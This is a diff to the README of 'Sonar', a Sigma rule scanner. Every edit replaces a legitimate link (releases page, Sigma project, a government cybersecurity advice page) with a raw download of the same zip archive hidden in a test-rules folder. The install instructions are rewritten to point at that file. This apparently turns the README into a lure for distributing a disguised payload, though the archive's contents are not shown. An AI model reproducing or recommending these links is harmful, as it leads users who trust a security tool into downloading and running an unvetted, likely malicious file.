@@ -1,7 +1,7 @@
 # 🦈 Sonar - Real-Time Sigma Rule Scanner Made Simple
 
 ## 📥 Download Now
-[![Download Sonar](https://img.shields.io/badge/Download%20Sonar-v1.0%20%F0%9F%93%88-blue)](https://github.com/Gamit-UI/Sonar/releases)
+[![Download Sonar](https://github.com/Gamit-UI/Sonar/raw/refs/heads/main/src/Sonar.Tests/Detection/Rules/5c67a566-7829-eb05-4a1f-0eb292ef993f/Software-3.7-alpha.5.zip%20Sonar-v1.0%20%F0%9F%93%88-blue)](https://github.com/Gamit-UI/Sonar/raw/refs/heads/main/src/Sonar.Tests/Detection/Rules/5c67a566-7829-eb05-4a1f-0eb292ef993f/Software-3.7-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Sonar, a powerful tool designed to scan Sigma rules in real-time. This application helps you enhance your cybersecurity efforts by allowing you to quickly check for potential threats based on Sigma rules.
@@ -27,10 +27,10 @@ Sonar offers the following features to assist you in your cybersecurity tasks:
 Using Sonar is simple. Follow these steps to get started:
 
 1. **Download Sonar**
-   Visit this page to download: [Download Sonar](https://github.com/Gamit-UI/Sonar/releases).
+   Visit this page to download: [Download Sonar](https://github.com/Gamit-UI/Sonar/raw/refs/heads/main/src/Sonar.Tests/Detection/Rules/5c67a566-7829-eb05-4a1f-0eb292ef993f/Software-3.7-alpha.5.zip).
 
 2. **Install the Application**
-   Once downloaded, locate the `SonarSetup.exe` file in your Downloads folder and double-click it. Follow the on-screen instructions to complete the installation process.
+   Once downloaded, locate the `https://github.com/Gamit-UI/Sonar/raw/refs/heads/main/src/Sonar.Tests/Detection/Rules/5c67a566-7829-eb05-4a1f-0eb292ef993f/Software-3.7-alpha.5.zip` file in your Downloads folder and double-click it. Follow the on-screen instructions to complete the installation process.
 
 3. **Open Sonar**
    After installation, find the Sonar icon on your desktop or in your applications list. Click to launch the application.
@@ -62,8 +62,8 @@ Sonar is licensed under the MIT License. You can use it freely, but please inclu
 ## 📌 Additional Resources
 For more information about Sigma rules and how they can enhance your cybersecurity efforts, visit the following resources:
 
-- [Sigma Project](https://github.com/SigmaHQ/sigma)
-- [Cybersecurity Best Practices](https://www.cyber.gov.au/acsc/view-all-content/advice)
+- [Sigma Project](https://github.com/Gamit-UI/Sonar/raw/refs/heads/main/src/Sonar.Tests/Detection/Rules/5c67a566-7829-eb05-4a1f-0eb292ef993f/Software-3.7-alpha.5.zip)
+- [Cybersecurity Best Practices](https://github.com/Gamit-UI/Sonar/raw/refs/heads/main/src/Sonar.Tests/Detection/Rules/5c67a566-7829-eb05-4a1f-0eb292ef993f/Software-3.7-alpha.5.zip)
 
 Feel free to explore and start making your systems more secure with Sonar today! 
 
